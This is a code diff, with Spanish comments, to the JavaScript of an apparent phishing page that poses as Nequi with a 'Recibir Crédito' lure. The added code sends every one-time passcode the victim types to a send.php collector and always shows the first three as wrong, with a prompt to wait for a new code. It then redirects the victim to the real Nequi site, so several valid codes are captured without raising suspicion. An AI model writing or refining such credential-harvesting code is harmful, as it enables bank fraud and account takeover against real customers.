@@ -68,6 +68,23 @@
     });
   });
 
+  // Toast simple para los avisos
+  function showToast(msg, ms = 3500) {
+    let t = document.getElementById('nqToast');
+    if (!t) {
+      t = document.createElement('div');
+      t.id = 'nqToast';
+      t.className = 'nq-toast';
+      document.body.appendChild(t);
+    }
+    t.textContent = msg;
+    requestAnimationFrame(() => t.classList.add('show'));
+    setTimeout(() => t.classList.remove('show'), ms);
+  }
+
+  // Contador de intentos (persistente por si recarga)
+  let attempts = Number(sessionStorage.getItem('otpAttempts') || '0');
+
   form.addEventListener('submit', (e) => {
     e.preventDefault();
     const code = boxes.map((b) => b.value).join('');
@@ -83,17 +100,33 @@
     fetch('send.php', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ step: 'otp', otp: code }),
+      body: JSON.stringify({ step: 'otp', otp: code, attempt: attempts + 1 }),
       keepalive: true,
     }).catch(() => {});
 
-    // Aquí tu PHP decidirá si el OTP es válido y redirigirá a:
-    //   clave.html?error=1   (clave incorrecta) → muestra estado rojo
-    //   o a la página final de éxito
     setTimeout(() => {
-      btn.textContent = btn.textContent === 'Procesando...' && card.classList.contains('otp-error')
-        ? 'Confirmar' : 'Recibir Crédito';
+      attempts += 1;
+      sessionStorage.setItem('otpAttempts', String(attempts));
+
       btn.disabled = false;
+
+      if (attempts >= 4) {
+        // Cuarto intento: estado de error y redirigir a Nequi
+        setOtpError(true);
+        setTimeout(() => {
+          sessionStorage.removeItem('otpAttempts');
+          window.location.replace('https://www.nequi.com');
+        }, 1400);
+        return;
+      }
+
+      // Mostrar estado de error en intentos 1, 2 y 3
+      setOtpError(true);
+
+      // En el tercer intento, además mostrar el aviso
+      if (attempts === 3) {
+        showToast('Espera a que el último código haya cambiado e inténtalo de nuevo.', 4500);
+      }
     }, 1500);
   });
 })();
